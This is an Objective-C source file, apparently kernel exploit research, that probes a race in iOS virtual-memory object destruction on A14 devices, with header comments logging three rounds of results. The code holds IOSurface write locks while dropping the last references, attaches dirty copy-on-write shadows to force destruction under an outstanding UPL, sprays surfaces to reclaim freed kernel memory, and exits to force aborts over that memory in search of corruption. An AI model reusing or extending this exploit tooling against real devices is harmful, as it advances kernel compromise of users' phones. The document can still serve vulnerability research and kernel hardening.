//
//  PlReqDrainProbe.m — T019 pl_req drain race (A14 26.5 / 23F77 retarget)
//
//  On 23F77, vm_object+0xf0 pl_req IS present (pl_req_begin/end strings).
//  XR 22H311 lacked the counter; 22H355 and 26.5 have drain waiters.
//  This probe assumes the drain-present (26.5) shape — expect destroy to
//  wait on pl_req, not "22H311 no drain". See A14_23F77_LabOffsets.h.
//
//  Window is still app-owned: IOSurfaceLock(write) -> IOSurfaceUnlock.
//
//  v1 results (2026-08-19): A 300/300 destroyed-under-UPL (deterministic),
//  clean exit flush => abort path is page-list-only and destroy left pages
//  wired (leak, not UAF). B was a no-op: shadow dst was never dirtied, so
//  collapse had nothing to merge.
//
//  v2 results (2026-08-19): sensor control passed (A's 300/300 confirmed
//  real). Spray+flush still no kernel panic — aborts over reclaimed memory
//  are tolerated; phase A residue is wired-page leak only. B's oracle was
//  semantically void: COW isolation means a dying copy object's dirty pages
//  are DISCARDED, never merged into the live source — the tag can never
//  appear in the surface, so "collapse-in-window" is unobservable that way.
//
//  v3: phase C replaces B. Waiter B (0xf3a5c0: drain pl_req, then read
//  O->vo_copy) is the path where O DIES with a copy object attached — the
//  shadow sever/fold. Shape: attach a dirty shadow to the surface object,
//  write-lock (UPL outstanding), release the surface (C's shadow-ref is
//  now O's last ref — WE pick the destroy moment), then dealloc dst:
//  C dies -> sever -> vm_object_destroy(O) runs with pl_req held and a
//  shadow to fold. 22H355 drains first; 22H311 does not.
//

#import "PlReqDrainProbe.h"

#import <dlfcn.h>
#import <fcntl.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>
#import <mach/mach.h>
#import <CoreFoundation/CoreFoundation.h>

extern kern_return_t mach_vm_allocate(vm_map_t target,
                                      mach_vm_address_t *address,
                                      mach_vm_size_t size,
                                      int flags);
extern kern_return_t mach_vm_deallocate(vm_map_t target,
                                        mach_vm_address_t address,
                                        mach_vm_size_t size);
extern kern_return_t mach_vm_copy(vm_map_t target,
                                  mach_vm_address_t source_address,
                                  mach_vm_size_t size,
                                  mach_vm_address_t dest_address);
extern vm_size_t vm_page_size;

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
typedef kern_return_t (*IOSurfaceLock_t)(IOSurfaceRef, uint32_t, void *);
typedef void (*IOSurfaceUnlock_t)(IOSurfaceRef, uint32_t, void *);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);

#define T019_PAGES      32          /* 512 KB surface at 16K pages */
#define T019_A_CYCLES   200
#define T019_C_CYCLES   200
#define T019_CANARY     0x5151515151515151ULL

static NSMutableString *t019_out;
static int t019_logfd = -1;

static IOSurfaceCreate_t pCreate;
static IOSurfaceGetID_t pGetID;
static IOSurfaceLookup_t pLookup;
static IOSurfaceLock_t pLock;
static IOSurfaceUnlock_t pUnlock;
static IOSurfaceGetBaseAddress_t pBase;

static void t019_log(BOOL sync, const char *fmt, ...)
{
    char lb[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb), fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;
    [t019_out appendFormat:@"%s\n", lb];
    if (t019_logfd >= 0) {
        write(t019_logfd, lb, (size_t)n);
        write(t019_logfd, "\n", 1);
        if (sync)
            fcntl(t019_logfd, F_FULLFSYNC);
    }
}

static IOSurfaceRef t019_surface_create(size_t len)
{
    NSDictionary *props = @{
        @"IOSurfaceWidth": @(len / 4),
        @"IOSurfaceHeight": @1,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(len),
        @"IOSurfaceAllocSize": @(len),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    return pCreate((__bridge CFDictionaryRef)props);
}

/* Fill the surface CPU view with the canary (locked write + unlock). */
static BOOL t019_surface_seed(IOSurfaceRef s, size_t len)
{
    if (pLock(s, 0, NULL) != KERN_SUCCESS)
        return NO;
    uint64_t *b = pBase(s);
    if (!b) {
        pUnlock(s, 0, NULL);
        return NO;
    }
    for (size_t i = 0; i < len / 8; i++)
        b[i] = T019_CANARY;
    pUnlock(s, 0, NULL);
    return YES;
}

/* ---------- Phase A: destroy waiter vs outstanding write UPL ---------- */

/* v2 sensor control: lookup on a LIVE surface must succeed, otherwise the
 * destroyed-under-UPL signal from lookup-after-release is void. */
static BOOL t019_sensor_ok(size_t len)
{
    IOSurfaceRef s = t019_surface_create(len);
    if (!s)
        return NO;
    uint32_t sid = pGetID(s);
    IOSurfaceRef live = pLookup ? pLookup(sid) : NULL;
    BOOL ok = (live != NULL);
    t019_log(YES, "[*] sensor control: lookup(live sid=%u) -> %s",
             sid, ok ? "OK (non-nil)" : "NIL — SENSOR BROKEN, phase A void");
    if (live)
        CFRelease(live);
    CFRelease(s);
    return ok;
}

static void t019_phase_a(size_t len, atomic_uint_fast64_t *destroyed,
                         atomic_uint_fast64_t *deferred)
{
    t019_log(YES, "--- phase A: destroy-vs-write-UPL (%d cycles) ---",
             T019_A_CYCLES);
    for (int i = 0; i < T019_A_CYCLES; i++) {
        IOSurfaceRef s = t019_surface_create(len);
        if (!s) {
            t019_log(YES, "[A %d] create failed", i);
            continue;
        }
        uint32_t sid = pGetID(s);
        if (!t019_surface_seed(s, len)) {
            t019_log(YES, "[A %d] seed failed", i);
            CFRelease(s);
            continue;
        }

        kern_return_t kr = pLock(s, 0, NULL);   /* write lock: UPL held */
        if (kr != KERN_SUCCESS) {
            t019_log(YES, "[A %d] lock kr=%d", i, kr);
            CFRelease(s);
            continue;
        }

        /* drop our last stub ref while the mutating UPL is outstanding */
        t019_log(NO, "[A %d] locked, releasing last ref (sid=%u)", i, sid);
        if ((i & 0x3f) == 0)
            fcntl(t019_logfd, F_FULLFSYNC);
        CFRelease(s);
        usleep(2000);   /* let any async kernel teardown land */

        IOSurfaceRef s2 = pLookup ? pLookup(sid) : NULL;
        if (s2) {
            atomic_fetch_add(deferred, 1);
            /* kernel object survived: dealloc was deferred (lock holds a
             * ref) or another ref exists. Unlock via the fresh stub so the
             * commit/writeout runs on a valid handle. */
            pUnlock(s2, 0, NULL);
            CFRelease(s2);
        } else {
            /* Kernel object is GONE while its write UPL is still
             * outstanding: on 22H311 destroy ran with no pl_req drain.
             * The stale UPL abort fires at task teardown; keep cycling so
             * the wedge accumulates, and the exit flush at the end hammers
             * the abort path. */
            atomic_fetch_add(destroyed, 1);
            t019_log(YES, "[A %d] DESTROYED-UNDER-UPL sid=%u — destroy ran"
                          " with no drain (22H311 shape)", i, sid);
        }
    }
}

/* v2: reclaim whatever the wedged destroys freed (vm_object zone slots,
 * pages) with fresh touched surfaces, so the exit-flush aborts walk
 * reclaimed memory rather than free pool. */
static void t019_spray_before_flush(void)
{
    t019_log(YES, "[*] spray: 256 small touched surfaces to reclaim freed"
                  " object/page slots before flush");
    size_t slen = 16 * (size_t)vm_page_size;
    int made = 0;
    for (int i = 0; i < 256; i++) {
        IOSurfaceRef s = t019_surface_create(slen);
        if (!s)
            break;
        uint64_t *b = pBase(s);
        if (b) {
            for (size_t o = 0; o < slen; o += (size_t)vm_page_size)
                *(volatile uint64_t *)((uint8_t *)b + o) = 0x5AA55AA500000000ULL | (uint64_t)i;
        }
        CFRelease(s);   /* normal teardown: object freed, pages resident-unwired */
        made++;
    }
    t019_log(YES, "[*] spray done: %d surfaces", made);
}

/* ---------- Phase C: destroy with live dirty shadow under write UPL ---- */

/* v3. Waiter B is the O-dies-with-vo_copy path (drain pl_req, then fold the
 * copy). C's shadow holds a reference on O, so after the surface release,
 * O's last ref is C's — the dealloc of dst picks the exact destroy moment.
 * Destroy then runs with pl_req held AND a dirty shadow to sever/fold.
 * A panic here fires DURING the run (breadcrumb localizes), not at exit. */
static void t019_phase_c(size_t len, size_t page,
                         atomic_uint_fast64_t *wedged,
                         atomic_uint_fast64_t *deferred,
                         atomic_uint_fast64_t *copies)
{
    t019_log(YES, "--- phase C: destroy+shadow-sever vs write-UPL"
                  " (%d cycles) ---", T019_C_CYCLES);
    for (int i = 0; i < T019_C_CYCLES; i++) {
        uint64_t tag = 0xDEAD000000000000ULL | (uint64_t)i;

        IOSurfaceRef s = t019_surface_create(len);
        if (!s) {
            t019_log(YES, "[C %d] create failed", i);
            continue;
        }
        uint32_t sid = pGetID(s);
        if (!t019_surface_seed(s, len)) {
            CFRelease(s);
            continue;
        }
        mach_vm_address_t base = (mach_vm_address_t)pBase(s);

        mach_vm_address_t dst = 0;
        if (mach_vm_allocate(mach_task_self(), &dst, len,
                             VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
            CFRelease(s);
            continue;
        }
        kern_return_t kr = mach_vm_copy(mach_task_self(), base, len, dst);
        if (kr != KERN_SUCCESS) {
            if (i == 0)
                t019_log(YES, "[C] vm_copy kr=%d — no shadow on surface"
                              " object (phase C not drivable)", kr);
            mach_vm_deallocate(mach_task_self(), dst, len);
            CFRelease(s);
            if (i == 0)
                return;
            continue;
        }
        atomic_fetch_add(copies, 1);

        /* dirty every dst page -> shadow C holds resident dirty pages */
        for (uint64_t off = 0; off < len; off += page)
            *(volatile uint64_t *)(dst + off) = tag;

        kr = pLock(s, 0, NULL);       /* write UPL outstanding on O */
        if (kr != KERN_SUCCESS) {
            mach_vm_deallocate(mach_task_self(), dst, len);
            CFRelease(s);
            continue;
        }

        /* drop the surface; O survives only via C's shadow ref */
        CFRelease(s);
        usleep(1000);

        IOSurfaceRef s2 = pLookup(sid);
        if (s2) {                     /* surface object deferred */
            atomic_fetch_add(deferred, 1);
            pUnlock(s2, 0, NULL);
            CFRelease(s2);
            mach_vm_deallocate(mach_task_self(), dst, len);
            continue;
        }

        /* THE TARGET: C's death severs the shadow and drops O's last ref
         * -> vm_object_destroy(O) with pl_req held + dirty shadow to fold.
         * 22H355 drains pl_req first; 22H311 does not. */
        t019_log(NO, "[C %d] severing shadow -> destroy under UPL (sid=%u)",
                 i, sid);
        if ((i & 0x1f) == 0)
            fcntl(t019_logfd, F_FULLFSYNC);
        mach_vm_deallocate(mach_task_self(), dst, len);

        atomic_fetch_add(wedged, 1);  /* UPL still outstanding; abort at exit */
    }
}

@implementation PlReqDrainProbe

+ (NSString *)runPlReqDrainRace
{
    t019_out = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *lpath = [docs stringByAppendingPathComponent:@"t019_plreq_log.txt"];
    t019_logfd = open(lpath.fileSystemRepresentation,
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);

    t019_log(YES, "=== T019 pl_req drain (A14 23F77 / 26.5 — pl_req PRESENT) ===");
    t019_log(YES, "[*] vm_object+0xf0 pl_req live; expect destroy/collapse DRAIN (not XR 22H311)");
    t019_log(YES, "[*] window = IOSurfaceLock(write) .. Unlock — app-controlled");

    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                        RTLD_LAZY);
    if (!iosH)
        iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface",
                      RTLD_LAZY);
    if (!iosH) {
        t019_log(YES, "[x] dlopen IOSurface failed");
        goto out;
    }
    pCreate = (IOSurfaceCreate_t)dlsym(iosH, "IOSurfaceCreate");
    pGetID = (IOSurfaceGetID_t)dlsym(iosH, "IOSurfaceGetID");
    pLookup = (IOSurfaceLookup_t)dlsym(iosH, "IOSurfaceLookup");
    pLock = (IOSurfaceLock_t)dlsym(iosH, "IOSurfaceLock");
    pUnlock = (IOSurfaceUnlock_t)dlsym(iosH, "IOSurfaceUnlock");
    pBase = (IOSurfaceGetBaseAddress_t)dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!pCreate || !pGetID || !pLock || !pUnlock || !pBase) {
        t019_log(YES, "[x] missing IOSurface syms (create=%p lock=%p base=%p)",
                 pCreate, pLock, pBase);
        goto out;
    }
    t019_log(YES, "[*] IOSurface syms ok (lookup=%s)", pLookup ? "yes" : "NO");

    size_t page = (size_t)vm_page_size;
    size_t len = T019_PAGES * page;
    t019_log(YES, "[*] page=0x%zx surface=0x%zx (%d pages)", page, len,
             T019_PAGES);

    if (!pLookup) {
        t019_log(YES, "[x] no IOSurfaceLookup — phase A sensor unavailable");
        goto out;
    }
    if (!t019_sensor_ok(len)) {
        t019_log(YES, "[x] sensor control failed — fix lookup before phase A"
                      " numbers mean anything");
        goto out;
    }

    atomic_uint_fast64_t destroyed = 0, deferred = 0;
    atomic_uint_fast64_t c_wedged = 0, c_deferred = 0, copies = 0;

    t019_phase_a(len, &destroyed, &deferred);
    t019_log(YES, "[*] A done: destroyed-under-UPL=%llu deferred=%llu",
             (unsigned long long)atomic_load(&destroyed),
             (unsigned long long)atomic_load(&deferred));

    t019_phase_c(len, page, &c_wedged, &c_deferred, &copies);
    t019_log(YES, "[*] C done: shadows=%llu sever+destroy-under-UPL=%llu"
                  " deferred=%llu",
             (unsigned long long)atomic_load(&copies),
             (unsigned long long)atomic_load(&c_wedged),
             (unsigned long long)atomic_load(&c_deferred));

    /* Wedged write-UPLs (A + C) abort at task teardown. Reclaim freed
     * slots, then exit so the aborts walk reclaimed memory. */
    uint64_t total_wedged = atomic_load(&destroyed) + atomic_load(&c_wedged);
    if (total_wedged) {
        t019_spray_before_flush();
        t019_log(YES, "[*] flush: exiting to force %llu wedged UPL aborts over"
                      " sprayed memory (panic names the corruption the drain"
                      " prevents)",
                 (unsigned long long)total_wedged);
        close(t019_logfd);
        t019_logfd = -1;
        exit(0);
    }

    t019_log(YES, "=== verdict: %s ===",
             "clean — destroy deferred while locked on both phases; drain gap"
             " not confirmed from app");

out:
    if (t019_logfd >= 0) {
        close(t019_logfd);
        t019_logfd = -1;
    }
    return [t019_out copy];
}

@end
